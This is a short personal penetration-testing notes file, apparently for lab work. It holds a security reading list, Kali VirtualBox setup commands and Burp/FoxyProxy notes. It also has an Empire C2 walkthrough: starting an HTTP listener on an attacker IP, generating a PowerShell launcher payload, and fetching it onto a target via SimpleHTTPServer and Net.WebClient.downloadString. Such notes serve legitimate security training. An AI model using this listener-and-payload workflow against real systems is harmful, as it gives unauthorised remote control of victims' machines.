# To read

- Kali Revealed
- The Hacker Playbook 2
- No Starch Metasploit
- Smashing The Stack For Fun And Profit
- The Shellcoder’s Handbook
- Violent Python
- The Web Application Hacker's Handbook

## Kali on VirtualBox
```
apt-get upgrade
apt-get dist-upgrade
apt-get install -y virtualbox-guest-x11
install guest additions # see picture
```

# Tools

## Firefox ESR + FoxyProxy + Burps
Install version 4.6.5 that can run on Firefox ESR v52.5.0 (32-bit) using it with Burp v1.7.27

## Empire
[Empire github](https://github.com/EmpireProject/Empire/tree/dev)
### Setup
```
git clone https://github.com/EmpireProject/Empire -b dev # Clone the dev branch
cd Empire/setup
./install/sh
./empire.sh
```
### Usage
```
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://10.10.14.22:443
(Empire: listeners/http) > set Port 443
(Empire: listeners/http) > execute
[*] Starting listener 'http'
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > launcher powershell http # this generates the payload
```
Copy the payload output and paste it into a file that you'll serve with `SimpleHTTPServer` and get from the box using `Net.WebClient.downloadString` for example.

